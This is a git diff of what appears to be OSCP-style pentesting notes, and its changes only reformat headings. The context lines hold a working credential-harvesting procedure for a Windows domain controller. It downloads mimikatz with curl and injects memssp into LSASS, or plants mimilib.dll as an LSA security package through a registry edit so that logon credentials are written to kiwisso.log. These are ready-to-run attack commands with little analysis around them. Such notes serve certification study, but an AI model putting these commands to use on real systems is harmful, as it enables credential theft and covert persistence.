@@ -1553,13 +1553,13 @@ curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimi
 expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
 cd x64
 ```
-OPTION 1 - USING MIMIKLATZ INJECT INTO LASS (NOT STABLE 2016)
+##### OPTION 1 - USING MIMIKATZ INJECT INTO LASS (NOT STABLE 2016)
 ```
 .\mimikatz.exe
 privilege::debug
 misc::memssp
 ```
-OPTION 2 - COPIAR DLL E ALTERAR REGISTRO
+##### OPTION 2 - COPIAR DLL E ALTERAR REGISTRO
 ```
 copy mimilib.dll C:\Windows\System32
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
@@ -1569,8 +1569,6 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pac
 ```
 All Local Logons on the DC are logged to:
 C:\Windows\System32\kiwisso.log
-
-
 ### ADMIN SDHOLDER
 ##### ADMIN SDHOLDER - DEFAULT PROTECTED ADMINISTRATIVE GROUPS IN AD
 
